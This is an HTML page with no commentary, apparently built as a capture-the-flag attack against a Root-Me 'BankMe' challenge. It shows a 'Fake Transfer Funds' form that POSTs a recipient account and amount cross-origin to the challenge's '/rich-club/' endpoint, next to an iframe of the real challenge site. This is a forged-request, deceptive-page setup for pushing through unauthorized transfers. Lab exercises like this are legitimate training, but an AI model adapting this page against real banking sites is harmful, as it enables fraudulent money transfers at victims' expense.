<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BankMe - Transfer Funds</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: grid;
            grid-template-columns: 1fr 1fr;
            height: 100vh;
            background-color: #f4f4f9;
        }
        .left, .right {
            padding: 20px;
        }
        .left {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-shadow: 2px 0px 5px rgba(0, 0, 0, 0.1);
        }
        .right iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        h1 {
            color: #333;
        }
        label {
            display: block;
            margin: 15px 0 5px;
            font-weight: bold;
        }
        input {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="left">
        <h1>Fake Transfer Funds</h1>
        <form id="fakeForm" action="https://bankme-1.challenges.pro.root-me.org/rich-club/" method="POST">
            <label for="account">Recipient Account</label>
            <input type="text" id="account" name="account" placeholder="123456789" required>
            
            <label for="amount">Amount</label>
            <input type="number" id="amount" name="amount" placeholder="1000" required>
            
            <button type="submit">Transfer</button>
        </form>
    </div>
    <div class="right">
        <iframe src="https://bankme-1.challenges.pro.root-me.org/"></iframe>
    </div>
</body>
</html>
